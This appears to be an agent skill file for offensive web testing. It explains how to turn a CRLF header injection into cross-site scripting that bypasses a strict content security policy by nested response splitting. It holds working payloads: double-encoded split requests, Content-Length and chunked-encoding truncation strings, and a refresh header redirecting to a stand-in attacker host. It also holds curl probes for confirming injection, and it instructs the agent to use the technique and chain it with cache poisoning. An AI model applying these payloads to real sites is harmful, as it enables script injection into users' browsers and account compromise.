---
name: crlf-response-splitting
description: Nested response splitting to bypass strict CSP via CRLF injection. Turns header injection into XSS even when script-src is self only. Use when CRLF injection is confirmed in response headers and CSP blocks inline or external scripts.
---

# CRLF Injection -> Nested Response Splitting CSP Bypass

## Pattern
- CRLF injection exists in a response header such as `Content-Type` or `Location`
- CSP is strict enough to block inline script execution
- You can inject `\r\n\r\n` and split the response body
- Inline payloads are blocked by CSP, so you need a same-origin script gadget

## Core Technique
Use one CRLF-injectable endpoint to return HTML and load a second same-origin CRLF-injectable endpoint as JavaScript.

```
Outer split:  <script src="/vuln-endpoint?type=text/javascript%0d%0a%0d%0aalert(origin)//PADDING">
Inner split:  response with Content-Type: text/javascript and body alert(origin)
```

The nested request is same-origin, so `script-src 'self'` permits execution.

## Truncation Methods

### Missing Content-Length
Inject a shorter `Content-Length` in the nested response:
```
Content-Length: 13\r\n\r\nalert(origin)
```

### Transfer-Encoding: chunked
For HTTP/1.1 targets:
```
Transfer-Encoding: chunked\r\n\r\nd\r\nalert(origin)\r\n0\r\n\r\n
```

### Fixed Content-Length padding
Pad the payload with a JavaScript comment and filler bytes:
```
alert(origin)//AAAAAAAAAAAA
```

## Payload Construction

### Outer request
```
/endpoint?param=text/html%0d%0a%0d%0a<script+src="/endpoint?param=text/javascript%250d%250a%250d%250aalert(origin)"></script>
```

Double-encode the nested CRLF bytes so they survive the first parse.

### Inner request
Return JavaScript as `text/javascript` with a body containing the payload.

## Header-Only CRLF
If you can inject only one CRLF and not split the body, useful follow-on headers include:
- `Referrer-Policy: unsafe-url`
- `Refresh: 0;url=https://attacker.example`
- cache-control mutations for poisoning

## Detection
```bash
# Test for CRLF injection in headers
curl -sD- "https://target.com/endpoint?param=test%0d%0aX-Injected:true" | rg "X-Injected"

# Compare %0d%0a vs %0a behavior
curl -sD- "https://target.com/endpoint?param=test%0a%0aX-Injected:true" | rg "X-Injected"
```

**Checkpoint:** If `X-Injected` appears in response headers with `%0d%0a` but not with `%0a` alone, CRLF injection is confirmed. Check CSP with `curl -sD- URL | rg -i "content-security-policy"` to determine if nested splitting is needed.

## Chain With
- `web-cache-deception-path`
- `nextjs-cache-poisoning`
- `parser-differential-bypass`

## References
- https://lab.ctbb.show/research/crlf-injection-nested-response-splitting-csp-gadget
